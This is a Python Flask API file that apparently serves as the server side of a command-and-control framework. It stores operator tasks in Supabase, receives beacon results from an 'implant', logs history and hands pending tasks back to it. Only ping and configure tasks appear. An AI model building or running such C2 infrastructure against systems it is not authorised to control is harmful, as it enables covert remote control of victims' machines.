import uuid

from flask import request
from flask_restful import Resource


class Tasks(Resource):
    def __init__(self, supabase):
        self.supabase = supabase

    def get(self):
        try:
            response = self.supabase.table("tasks").select("*").execute()
            return response.data, 200
        except Exception as e:
            return {"error": str(e)}, 500

    def post(self):
        try:
            data = request.get_json()

            if not data:
                return {"error": "Request body must be JSON"}, 400

            # Either object or array of objects are accepted
            if isinstance(data, dict):
                data = [data]

            if not isinstance(data, list):
                return {"error": "Request body must be a JSON object or array of objects"}, 400

            inserted_tasks = []

            for item in data:
                task_id = str(uuid.uuid4())

                # Separate standard fields from task-type-specific parameters
                # ( dwell/running for ConfigureTask ). Parameters are stored
                # in a jsonb column so they can be returned to the implant later.
                standard_fields = {"title", "description", "status", "task_type"}
                parameters = {k: v for k, v in item.items() if k not in standard_fields}

                task = {
                    "id": task_id,
                    "title": item.get("title"),
                    "description": item.get("description"),
                    "status": item.get("status", "pending"),
                    "task_type": item.get("task_type"),
                    "parameters": parameters,  
                }

                if not task["title"]:
                    return {"error": "title is required"}, 400

                if not task["task_type"]:
                    return {"error": "task_type is required"}, 400

                task_response = self.supabase.table("tasks").insert(task).execute()
                inserted_tasks.extend(task_response.data)

            return inserted_tasks, 201
        
        except Exception as e:
            return {"error": str(e)}, 500


class Results(Resource):
    def __init__(self, supabase):
        self.supabase = supabase

    def get(self):
        try:
            response = self.supabase.table("results").select("*").execute()
            return response.data, 200
        except Exception as e:
            return {"error": str(e)}, 500

    def post(self):
        """
        Called by the implant during each beacon cycle.

        Receives a JSON object keyed by task UUID, where each value contains
        the result of that task:

        On an initial beacon before any tasks have run, the implant sends an
        empty object {}, which is handled gracefully.
        After processing incoming results (and writing history), this endpoint
        returns all pending tasks formatted for parseTasks():
            {
                "0": { "task_id": "...", "task_type": "ping" },
                "1": { "task_id": "...", "task_type": "configure", "dwell": 5.0, "running": true }
            } 
        """
        try:
            data = request.get_json() or {}
            

            if data is None:
                return {"error": "Request body must be JSON"}, 400

            if isinstance(data, list):
                return {"error": "Request body must be a JSON object, not a list"}, 400

            # 1. Process incoming results from the implant
            for task_id, result_data in data.items():
                contents = result_data.get("contents", "")

                # Insert into results table
                result = {
                    "id": str(uuid.uuid4()),
                    "task_id": task_id,
                    "output": contents,
                }
                self.supabase.table("results").insert(result).execute()

                # Fetch the original task so we can reconstruct the full task object for the history entry
                task_response = (
                    self.supabase.table("tasks")
                    .select("*")
                    .eq("id", task_id)
                    .execute()
                )

                if task_response.data:
                    task = task_response.data[0]
                    parameters = task.get("parameters") or {}

                    # Rebuild the full task payload  as original
                    task_object = {
                        "id": task_id,
                        "title": task.get("title"),
                        "description": task.get("description"),
                        "task_type": task.get("task_type"),
                        **parameters,
                    }

                    task_options = [f"{k}: {v}" for k, v in parameters.items()]

                    #history entry includes full task context and result
                    history_entry = {
                        "task_id": task_id,
                        "task_type": task.get("task_type"),
                        "task_object": task_object,
                        "task_options": task_options,
                        "task_results": contents,
                    }
                    self.supabase.table("history").insert(history_entry).execute()

                    # Mark the task completed
                    (
                        self.supabase.table("tasks")
                        .update({"status": "completed"})
                        .eq("id", task_id)
                        .execute()
                    )

            # 2. Fetch and return all pending tasks to the implant
            pending_response = (
                self.supabase.table("tasks")
                .select("*")
                .eq("status", "pending")
                .execute()
            )

            pending_tasks = pending_response.data

            # Build the response object that parseTasks() / parseTaskFrom() expects.
            # Each entry must contain at minimum task_id and task_type; extra
            # parameters (dwell, running for ConfigureTask) are merged in
            # from the stored parameters jsonb column.
            formatted_response = {}
            for i, task in enumerate(pending_tasks):
                task_entry = {
                    "task_id": task["id"],
                    "task_type": task["task_type"],
                }
                task_entry.update(task.get("parameters") or {})
                formatted_response[str(i)] = task_entry

                # Mark in_progress so the same task isn't sent on the next beacon before the implant has had a chance to run it and report back.
                (
                    self.supabase.table("tasks")
                    .update({"status": "in_progress"})
                    .eq("id", task["id"])
                    .execute()
                )

            return formatted_response, 200

        except Exception as e:
            return {"error": str(e)}, 500


class History(Resource):
    def __init__(self, supabase):
        self.supabase = supabase

    def get(self):
        try:
            response = self.supabase.table("history").select("*").execute()
            return response.data, 200
        except Exception as e:
            return {"error": str(e)}, 500